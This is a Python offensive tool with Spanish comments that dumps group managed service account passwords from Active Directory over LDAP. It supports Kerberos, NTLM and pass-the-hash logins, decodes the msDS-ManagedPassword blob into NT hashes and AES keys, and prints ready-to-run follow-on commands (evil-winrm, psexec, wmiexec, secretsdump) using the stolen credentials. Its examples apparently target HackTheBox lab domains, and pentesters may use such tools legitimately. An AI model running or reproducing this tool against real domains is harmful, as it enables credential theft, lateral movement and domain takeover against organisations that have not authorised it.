#!/usr/bin/env python3
"""
gMSA Password Dumper - ms-DS-ManagedPassword abuse

Requiere: impacket, ldap3, pycryptodome
  pip install impacket ldap3 pycryptodome

Uso:
  python3 gmsa_dump.py -d vintage.htb -dc dc01.vintage.htb -k          # Kerberos
  python3 gmsa_dump.py -d vintage.htb -dc dc01.vintage.htb -k -n       # Kerberos sin TLS
  python3 gmsa_dump.py -d corp.local -u USER -p PASS -dc 10.10.10.10   # NTLM
  python3 gmsa_dump.py -d corp.local -u USER -H NT -dc 10.10.10.10     # PtH
  # Agregar --color para salida con colores
"""

import argparse
import ssl
import sys
import struct
import os
from binascii import hexlify

# Dependencias

try:
    from Cryptodome.Hash import MD4
except ImportError:
    try:
        from Crypto.Hash import MD4
    except ImportError:
        print("[-] Instala pycryptodome: pip install pycryptodome")
        sys.exit(1)

try:
    from impacket.ldap import ldap as impacket_ldap, ldapasn1
    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
    from impacket.structure import Structure
    from impacket.krb5 import constants
    from impacket.krb5.crypto import string_to_key
except ImportError:
    print("[-] Instala impacket: pip install impacket")
    sys.exit(1)

try:
    from ldap3 import Server, Connection, ALL, NTLM, Tls, SASL, SUBTREE
    HAS_LDAP3 = True
except ImportError:
    HAS_LDAP3 = False


# Sistema de colores (--color)

class C:
    _on = False

    GREEN  = "\033[92m"   # éxito, hashes
    YELLOW = "\033[93m"   # warnings, hash anterior
    RED    = "\033[91m"   # errores
    CYAN   = "\033[96m"   # info [*]
    BLUE   = "\033[94m"   # comandos
    WHITE  = "\033[97m"   # etiquetas resaltadas
    GRAY   = "\033[90m"   # separadores, texto secundario
    RESET  = "\033[0m"

    @classmethod
    def enable(cls):
        cls._on = True

    @classmethod
    def _c(cls, color, text):
        return f"{color}{text}{cls.RESET}" if cls._on else text

    # Helpers semánticos
    @classmethod
    def ok(cls, t):    return cls._c(cls.GREEN,  t)
    @classmethod
    def info(cls, t):  return cls._c(cls.CYAN,   t)
    @classmethod
    def warn(cls, t):  return cls._c(cls.YELLOW, t)
    @classmethod
    def err(cls, t):   return cls._c(cls.RED,    t)
    @classmethod
    def cmd(cls, t):   return cls._c(cls.BLUE,   t)
    @classmethod
    def hi(cls, t):    return cls._c(cls.WHITE,  t)
    @classmethod
    def dim(cls, t):   return cls._c(cls.GRAY,   t)
    @classmethod
    def val(cls, t):   return cls._c(cls.GREEN,  t)


def p_ok(msg):   print(f"{C.ok('[+]')} {msg}")
def p_info(msg): print(f"{C.info('[*]')} {msg}")
def p_warn(msg): print(f"{C.warn('[!]')} {msg}")
def p_err(msg):  print(f"{C.err('[-]')} {msg}")


# Parseo del blob

class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version',                        '<H'),
        ('Reserved',                       '<H'),
        ('Length',                         '<L'),
        ('CurrentPasswordOffset',          '<H'),
        ('PreviousPasswordOffset',         '<H'),
        ('QueryPasswordIntervalOffset',    '<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',                ':'),
        ('PreviousPassword',               ':'),
        ('QueryPasswordInterval',          ':'),
        ('UnchangedPasswordInterval',      ':'),
    )

    def fromString(self, data):
        Structure.fromString(self, data)

        if self['PreviousPasswordOffset'] == 0:
            end_current = self['QueryPasswordIntervalOffset']
        else:
            end_current = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[
            self['CurrentPasswordOffset']:end_current
        ]

        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[
                self['PreviousPasswordOffset']:self['QueryPasswordIntervalOffset']
            ]
        else:
            self['PreviousPassword'] = b''

        self['QueryPasswordInterval'] = self.rawData[
            self['QueryPasswordIntervalOffset']:self['UnchangedPasswordIntervalOffset']
        ]
        self['UnchangedPasswordInterval'] = self.rawData[
            self['UnchangedPasswordIntervalOffset']:
        ]


# Cálculo de hashes

def domain_to_dn(domain):
    return ",".join(f"DC={p}" for p in domain.split("."))


def compute_hashes(sam, domain, raw_password_utf16):
    """
    raw_password_utf16: CurrentPassword del blob (incluye 2 bytes null al final).
    Retorna (nt_hash, aes128, aes256).
    """
    password_bytes = raw_password_utf16[:-2]

    # NT Hash
    h = MD4.new()
    h.update(password_bytes)
    nt_hash = hexlify(h.digest()).decode()

    # AES keys para Kerberos
    password_utf8 = password_bytes.decode('utf-16-le', 'replace').encode('utf-8')
    salt = f"{domain.upper()}host{sam[:-1].lower()}.{domain.lower()}"

    aes128 = hexlify(string_to_key(
        constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
        password_utf8, salt
    ).contents).decode()

    aes256 = hexlify(string_to_key(
        constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
        password_utf8, salt
    ).contents).decode()

    return nt_hash, aes128, aes256


# Print de los resultados

def print_results(sam, domain, current_raw, previous_raw=None, use_kerberos=False, dc_host="<IP>"):
    realm = domain.upper()
    sep = C.dim("─" * 57)

    print(f"\n  {sep}")

    if not current_raw:
        print(f"  {C.err('[!]')} No se pudo obtener la contraseña actual")
        return

    nt, aes128, aes256 = compute_hashes(sam, domain, current_raw)

    # ── Hashes ──
    print(f"  {C.ok('✓')} {C.hi('NT Hash ')} : {C.val(nt)}")
    print(f"  {C.ok('✓')} {C.hi('AES-256 ')} : {C.val(aes256)}")
    print(f"  {C.ok('✓')} {C.hi('AES-128 ')} : {C.val(aes128)}")
    print(f"\n  {sep}")

    sam_clean = sam.rstrip("$")

    if use_kerberos:
        cmd_tgt     = "getTGT.py -aesKey " + aes256 + " " + domain + "/" + sam
        cmd_export  = "export KRB5CCNAME=" + sam_clean + ".ccache"
        cmd_winrm   = "evil-winrm -i " + dc_host + " -r " + realm + " -u " + sam
        cmd_nxc     = "netexec smb " + dc_host + " -u " + sam + " -H " + nt + " -k"
        cmd_wmi     = "wmiexec.py -k -no-pass " + sam + "@" + dc_host
        cmd_psexec  = "psexec.py -k -no-pass " + sam + "@" + dc_host
        cmd_secrets = "secretsdump.py -k -no-pass " + dc_host

        print(f"  {C.dim('─')} {C.warn('[ Kerberos — obtén TGT primero ]')}")
        print(f"  {C.dim('─')} {C.hi('getTGT    ')} {C.cmd(cmd_tgt)}")
        print(f"  {C.dim('─')} {C.hi('export    ')} {C.cmd(cmd_export)}")
        print(f"\n  {C.dim('─')} {C.warn('[ Con ticket activo ]')}")
        print(f"  {C.dim('─')} {C.hi('evil-winrm')} {C.cmd(cmd_winrm)}")
        print(f"  {C.dim('─')} {C.hi('netexec   ')} {C.cmd(cmd_nxc)}")
        print(f"  {C.dim('─')} {C.hi('wmiexec   ')} {C.cmd(cmd_wmi)}")
        print(f"  {C.dim('─')} {C.hi('psexec    ')} {C.cmd(cmd_psexec)}")
        print(f"  {C.dim('─')} {C.hi('secretsdmp')} {C.cmd(cmd_secrets)}")
    else:
        cmd_winrm  = "evil-winrm -i " + dc_host + " -u '" + sam + "' -H '" + nt + "'"
        cmd_nxc    = "netexec smb " + dc_host + " -u '" + sam + "' -H '" + nt + "'"
        cmd_wmi    = "wmiexec.py -hashes :" + nt + " '" + sam + "'@" + dc_host
        cmd_psexec = "psexec.py -hashes :" + nt + " '" + sam + "'@" + dc_host
        cmd_tgt    = "getTGT.py -aesKey " + aes256 + " " + domain + "/" + sam

        print(f"  {C.dim('─')} {C.warn('[ NTLM / Pass-the-Hash ]')}")
        print(f"  {C.dim('─')} {C.hi('evil-winrm')} {C.cmd(cmd_winrm)}")
        print(f"  {C.dim('─')} {C.hi('netexec   ')} {C.cmd(cmd_nxc)}")
        print(f"  {C.dim('─')} {C.hi('wmiexec   ')} {C.cmd(cmd_wmi)}")
        print(f"  {C.dim('─')} {C.hi('psexec    ')} {C.cmd(cmd_psexec)}")
        print(f"  {C.dim('─')} {C.hi('getTGT    ')} {C.cmd(cmd_tgt)}")

    # ── Hash anterior ──
    if previous_raw and any(b != 0 for b in previous_raw):
        nt_prev, _, _ = compute_hashes(sam, domain, previous_raw)
        print(f"\n  {C.warn('✓')} {C.hi('NT Hash anterior')} : {C.warn(nt_prev)}")


# MODO 1: Impacket LDAP — Kerberos / NTLM
# Kerberos con ccache nativo, LDAPS → LDAP fallback

def dump_impacket(domain, dc_ip, username, password, nt_hash, base_dn, use_kerberos, no_tls):
    p_info("Conectando via impacket LDAP...")

    def try_connect(proto):
        url = f"{proto}://{dc_ip}"
        try:
            conn = impacket_ldap.LDAPConnection(url, base_dn, dc_ip)
            if use_kerberos:
                ccache = os.environ.get("KRB5CCNAME", "/tmp/krb5cc_1000")
                os.environ["KRB5CCNAME"] = ccache
                p_info(f"Kerberos auth (ccache: {C.hi(ccache)})")
                conn.kerberosLogin(
                    username or "", "", domain,
                    lmhash="", nthash="",
                    kdcHost=dc_ip, useCache=True
                )
            elif nt_hash:
                p_info("NTLM Pass-the-Hash")
                conn.login(username, "", domain,
                           lmhash="aad3b435b51404eeaad3b435b51404ee",
                           nthash=nt_hash)
            else:
                p_info("NTLM Password auth")
                conn.login(username, password, domain)
            return conn
        except Exception as e:
            p_err(f"Fallo {proto}: {e}")
            return None

    conn = None
    if not no_tls:
        conn = try_connect("ldaps")
    if not conn:
        if not no_tls:
            p_info("Reintentando con LDAP plano...")
        conn = try_connect("ldap")
    if not conn:
        return False

    p_ok(f"Conectado exitosamente\n")

    # Resolver SID → sAMAccountName
    sid_cache = {}
    def search_sam(base, fltr, attrs):
        if fltr in sid_cache:
            return sid_cache[fltr]
        try:
            resp = conn.search(searchBase=base, searchFilter=fltr, attributes=attrs)
            for item in resp:
                if isinstance(item, ldapasn1.SearchResultEntry):
                    for attr in item['attributes']:
                        if str(attr['type']) == 'sAMAccountName':
                            val = str(attr['vals'][0])
                            sid_cache[fltr] = val
                            return val
        except Exception:
            pass
        return None

    p_info(f"Buscando cuentas gMSA en {base_dn}...")
    try:
        resp = conn.search(
            searchBase=base_dn,
            searchFilter="(objectClass=msDS-GroupManagedServiceAccount)",
            attributes=["sAMAccountName", "distinguishedName",
                        "msDS-ManagedPassword", "msDS-GroupMSAMembership"],
        )
    except Exception as e:
        p_err(f"Error en búsqueda LDAP: {e}")
        return False

    entries = [e for e in resp if isinstance(e, ldapasn1.SearchResultEntry)]
    if not entries:
        p_err("No se encontraron cuentas gMSA")
        return False

    p_ok(f"Encontradas {C.hi(str(len(entries)))} cuenta(s) gMSA\n")

    for entry in entries:
        attrs = {}
        for attr in entry['attributes']:
            key = str(attr['type'])
            attrs[key] = [bytes(v) for v in attr['vals']]

        sam = attrs.get('sAMAccountName', [b'N/A'])[0].decode(errors='replace')
        dn  = attrs.get('distinguishedName', [b'N/A'])[0].decode(errors='replace')

        print(C.dim("=" * 65))
        print(f"  {C.hi('gMSA')}    : {C.ok(sam)}")
        print(f"  {C.hi('DN')}      : {C.dim(dn)}")

        sd_raw = attrs.get('msDS-GroupMSAMembership', [None])[0]
        if sd_raw:
            try:
                sd = SR_SECURITY_DESCRIPTOR(data=sd_raw)
                print(f"  {C.hi('ReadGMSAPassword')} permitido a:")
                for ace in sd['Dacl']['Data']:
                    sid_str = ace['Ace']['Sid'].formatCanonical()
                    name = search_sam(base_dn, f"(objectSid={sid_str})", ["sAMAccountName"]) or sid_str
                    print(f"    {C.dim('-')} {C.warn(name)}  {C.dim('[' + sid_str + ']')}")
            except Exception as e:
                p_warn(f"Error parseando ACL: {e}")
        else:
            p_warn("msDS-GroupMSAMembership: no accesible")

        mp_raw = attrs.get('msDS-ManagedPassword', [None])[0]
        if not mp_raw:
            p_err("msDS-ManagedPassword: vacío (sin permiso o sin TLS)")
            print()
            continue

        try:
            blob = MSDS_MANAGEDPASSWORD_BLOB()
            blob.fromString(mp_raw)
            current_raw  = blob['CurrentPassword']
            previous_raw = blob['PreviousPassword'] if blob['PreviousPasswordOffset'] != 0 else None
            print_results(sam, domain, current_raw, previous_raw,
                          use_kerberos=use_kerberos, dc_host=dc_ip)
        except Exception as e:
            p_err(f"Error parseando blob: {e}")

        print()

    return True


# MODO 2: ldap3 NTLM — fallback TLS automático
# LDAPS (válido) → LDAPS (sin validar) → StartTLS → LDAP plano

def dump_ldap3(domain, dc_ip, username, password, nt_hash, base_dn, no_tls):
    if not HAS_LDAP3:
        p_err("ldap3 no instalado: pip install ldap3")
        return False

    user_dn      = f"{domain.upper()}\\{username}"
    tls_noverify = Tls(validate=ssl.CERT_NONE)
    tls_strict   = Tls(validate=ssl.CERT_REQUIRED)

    attempts = [(389, False, None, "LDAP sin TLS")] if no_tls else [
        (636, True,  tls_strict,   "LDAPS TLS validado"),
        (636, True,  tls_noverify, "LDAPS sin validar (autofirmado)"),
        (389, False, tls_noverify, "LDAP + StartTLS sin validar"),
        (389, False, None,         "LDAP sin TLS (fallback)"),
    ]

    conn     = None
    used_tls = False
    for port, use_ssl, tls_obj, desc in attempts:
        p_info(f"Intentando {desc} ({dc_ip}:{port})...")
        try:
            kwargs = {"host": dc_ip, "port": port, "use_ssl": use_ssl, "get_info": ALL}
            if tls_obj:
                kwargs["tls"] = tls_obj
            server = Server(**kwargs)

            c = Connection(
                server,
                user=user_dn,
                password=f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}" if nt_hash else password,
                authentication=NTLM
            )

            if not use_ssl and tls_obj:
                c.open()
                c.start_tls()

            if c.bind():
                p_ok(f"Conectado via {desc}")
                conn     = c
                used_tls = use_ssl or (tls_obj is not None)
                break
            else:
                p_err(f"Bind fallido: {c.result.get('description', c.result)}")
                try:
                    c.unbind()
                except Exception:
                    pass
        except Exception as e:
            p_err(f"Fallo: {e}")

    if not conn:
        return False

    if not used_tls:
        p_warn("Sin TLS — msDS-ManagedPassword puede no estar disponible en algunos DCs")

    def search_sam(base, fltr, attrs):
        conn.search(base, fltr, attributes=attrs)
        if conn.entries:
            return str(conn.entries[0].sAMAccountName)
        return None

    print()
    p_info(f"Buscando cuentas gMSA en {base_dn}...")
    conn.search(
        search_base=base_dn,
        search_filter="(objectClass=msDS-GroupManagedServiceAccount)",
        search_scope=SUBTREE,
        attributes=["sAMAccountName", "distinguishedName",
                    "msDS-ManagedPassword", "msDS-GroupMSAMembership"],
    )

    if not conn.entries:
        p_err("No se encontraron cuentas gMSA")
        conn.unbind()
        return False

    p_ok(f"Encontradas {C.hi(str(len(conn.entries)))} cuenta(s) gMSA\n")

    for entry in conn.entries:
        sam = str(entry.sAMAccountName) if entry.sAMAccountName else "N/A"
        dn  = str(entry.distinguishedName) if entry.distinguishedName else "N/A"

        print(C.dim("=" * 65))
        print(f"  {C.hi('gMSA')}    : {C.ok(sam)}")
        print(f"  {C.hi('DN')}      : {C.dim(dn)}")

        sd_raw = entry["msDS-GroupMSAMembership"].raw_values
        if sd_raw:
            try:
                sd = SR_SECURITY_DESCRIPTOR(data=sd_raw[0])
                print(f"  {C.hi('ReadGMSAPassword')} permitido a:")
                for ace in sd['Dacl']['Data']:
                    sid_str = ace['Ace']['Sid'].formatCanonical()
                    name = search_sam(base_dn, f"(objectSid={sid_str})", ["sAMAccountName"]) or sid_str
                    print(f"    {C.dim('-')} {C.warn(name)}  {C.dim('[' + sid_str + ']')}")
            except Exception as e:
                p_warn(f"Error parseando ACL: {e}")

        mp = entry["msDS-ManagedPassword"].raw_values
        if not mp:
            p_err("msDS-ManagedPassword: vacío")
            print()
            continue

        try:
            blob = MSDS_MANAGEDPASSWORD_BLOB()
            blob.fromString(mp[0])
            current_raw  = blob['CurrentPassword']
            previous_raw = blob['PreviousPassword'] if blob['PreviousPasswordOffset'] != 0 else None
            print_results(sam, domain, current_raw, previous_raw,
                          use_kerberos=False, dc_host=dc_ip)
        except Exception as e:
            p_err(f"Error parseando blob: {e}")

        print()

    conn.unbind()
    return True


# Main Function

def main():
    parser = argparse.ArgumentParser(
        description="gMSA Password Dumper — NT hash + AES keys",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  # Kerberos sin TLS
  python3 gmsa_dump.py -d vintage.htb -dc dc01.vintage.htb -k -n --color

  # Kerberos entorno real (auto TLS)
  python3 gmsa_dump.py -d corp.local -dc dc01.corp.local -k --color

  # NTLM password
  python3 gmsa_dump.py -d corp.local -u john -p 'P@ss' -dc 10.10.10.10

  # Pass-the-Hash
  python3 gmsa_dump.py -d corp.local -u john -H <NT> -dc 10.10.10.10 --color
        """
    )
    parser.add_argument("-d",   "--domain",   required=True,       help="Dominio (ej: corp.local)")
    parser.add_argument("-u",   "--username",  default=None,        help="Usuario (opcional con -k)")
    parser.add_argument("-p",   "--password",  default="",          help="Contraseña")
    parser.add_argument("-H",   "--hash",      default=None,        help="NT Hash (NTLM o LM:NT)")
    parser.add_argument("-dc",  "--dc-ip",     required=True,       help="IP o hostname del DC")
    parser.add_argument("-n",   "--no-tls",    action="store_true", help="Forzar LDAP sin TLS")
    parser.add_argument("-k",   "--kerberos",  action="store_true", help="Usar ticket Kerberos (klist)")
    parser.add_argument("--base-dn",           default=None,        help="Base DN personalizado")
    parser.add_argument("--color",             action="store_true", help="Salida con colores ANSI")

    args = parser.parse_args()

    if args.color:
        C.enable()

    if not args.kerberos and not args.username:
        parser.error("-u/--username es requerido cuando no se usa -k")

    nt_hash = args.hash.split(":")[-1] if args.hash else None
    base_dn = args.base_dn or domain_to_dn(args.domain)

    if args.kerberos:
        ccache = os.environ.get("KRB5CCNAME", "/tmp/krb5cc_1000")
        p_info(f"Ticket Kerberos: {C.hi(ccache)}")

    auth_str = "Kerberos" if args.kerberos else ("PtH NTLM" if nt_hash else "NTLM Password")
    tls_str  = "Desactivado" if args.no_tls else "Auto (LDAPS → StartTLS → plain)"

    print(f"""
{C.hi('[*] gMSA Password Dumper')}
    Dominio  : {C.info(args.domain)}
    Usuario  : {C.info(args.username or '(del ticket)')}
    DC       : {C.info(args.dc_ip)}
    Base DN  : {C.dim(base_dn)}
    Auth     : {C.warn(auth_str)}
    TLS      : {C.dim(tls_str)}
""")

    if args.kerberos:
        ok = dump_impacket(
            domain=args.domain, dc_ip=args.dc_ip,
            username=args.username, password=args.password,
            nt_hash=nt_hash, base_dn=base_dn,
            use_kerberos=True, no_tls=args.no_tls
        )
    else:
        ok = dump_ldap3(
            domain=args.domain, dc_ip=args.dc_ip,
            username=args.username, password=args.password,
            nt_hash=nt_hash, base_dn=base_dn, no_tls=args.no_tls
        )

    if not ok:
        sys.exit(1)


if __name__ == "__main__":
    main()
